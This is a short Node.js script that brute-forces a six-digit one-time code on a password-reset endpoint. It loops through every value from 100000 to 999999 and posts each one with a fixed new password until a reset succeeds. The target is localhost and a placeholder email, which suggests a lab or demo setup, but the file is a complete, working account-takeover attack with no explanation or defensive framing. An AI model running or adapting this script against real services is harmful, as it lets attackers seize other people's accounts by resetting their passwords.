const axios = require('axios');

async function tryOtp(email, otp) {
    try {
        const response = await axios.post('http://localhost:3000/reset-password', {
            email: email,
            otp: otp,
            newPassword: 'newPassword123'
        });
        console.log(`Success with OTP: ${otp}`, response.data);
        return true; 
    } catch (error) {
        console.log(`Failed with OTP: ${otp}`);
        return false; 
    }
}

async function bruteForceOtp(email) {
    for (let otp = 100000; otp <= 999999; otp++) {
        const isSuccess = await tryOtp(email, otp.toString());
        if (isSuccess) {
            break; 
        }
    }
}

bruteForceOtp('test@example.com');
